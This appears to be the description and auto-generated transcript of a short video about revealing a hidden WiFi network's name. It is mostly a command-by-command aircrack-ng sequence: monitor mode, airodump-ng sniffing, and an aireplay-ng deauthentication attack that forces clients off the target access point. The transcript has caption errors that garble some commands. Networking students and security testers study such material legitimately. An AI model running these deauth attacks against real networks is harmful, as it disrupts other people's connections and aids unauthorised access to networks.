title: WiFi Myths: Hidden WiFi network is hidden ðŸ˜±
description:
Commands Used:
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iw dev
sudo airodump-ng wlan0mon
Press ctrl + c to stop airodump-ng
sudo airodump-ng --bssid C2:0A:0F:DE:E0:71 -- channel 11 wlan0mon 
Open new tab
sudo aireplay-ng -0 30 -a C2:0A:0F:DE:E0:71 wlan0mon

Replace C2:0A:0F:DE:E0:71 in your command with the correct value.

#wifi #kalilinux #passwords
transcript: Did you know that you can discover the hidden access points ESSID? First we need to put our Wi-Fi adapter into monitor mode we can do so using the command sudo airmon -ng check kill and then running sudo airmon -ngstart wlan0. We now run the command sudo airodump -ng wlan0mon you will now see an ESSID with length of zero. We now stopped the airodump-ng sniffing we found the MAC address of the access point and channel on which we need to start a new airodump instance. We will use the BSSID which is the MAC address of the access point to run the command airodump -ng BSSID Mac Address of the access point Channel followed by the channel the Wi-Fi was on we now run the command aireplay -ng -030 -a this will send deauth packets. When you switch back to the airdump tabwe can see that we now have the ESSID
